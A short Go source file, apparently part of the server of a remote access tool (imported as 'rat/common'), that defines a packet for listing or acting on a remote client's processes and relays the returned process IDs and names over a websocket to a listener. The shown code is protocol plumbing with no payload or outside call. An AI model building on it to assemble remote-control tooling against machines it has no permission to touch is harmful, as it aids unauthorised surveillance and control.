package main

import (
	"fmt"
	"rat/common"

	"encoding/json"

	"golang.org/x/net/websocket"
)

type ProcessPacket struct {
	Type int
	PIDs []int
}

func (packet ProcessPacket) GetHeader() common.PacketHeader {
	return common.ProcessHeader
}

func (packet ProcessPacket) Write(c *Client) error {
	c.WriteInt(packet.Type)

	c.WriteInt(len(packet.PIDs))

	for _, pid := range packet.PIDs {
		c.WriteInt(pid)
	}

	return nil
}

func (packet ProcessPacket) Read(c *Client) error {
	len, _ := c.ReadInt()

	for i := 0; i < len; i++ {
		pid, err := c.ReadInt()
		name, err := c.ReadString()

		if err != nil {
			fmt.Println("process:", err.Error())
		}

		if ws, ok := c.Listeners[common.ProcessHeader]; ok {
			message := ProcessMessage{pid, name}
			mstr, _ := json.Marshal(&message)
			event := newEvent(ProcessQueryEvent, c.Id, string(mstr))

			err = websocket.JSON.Send(ws, &event)

			if err != nil {
				return err
			}
		}
	}

	delete(c.Listeners, common.ProcessHeader)

	return nil
}
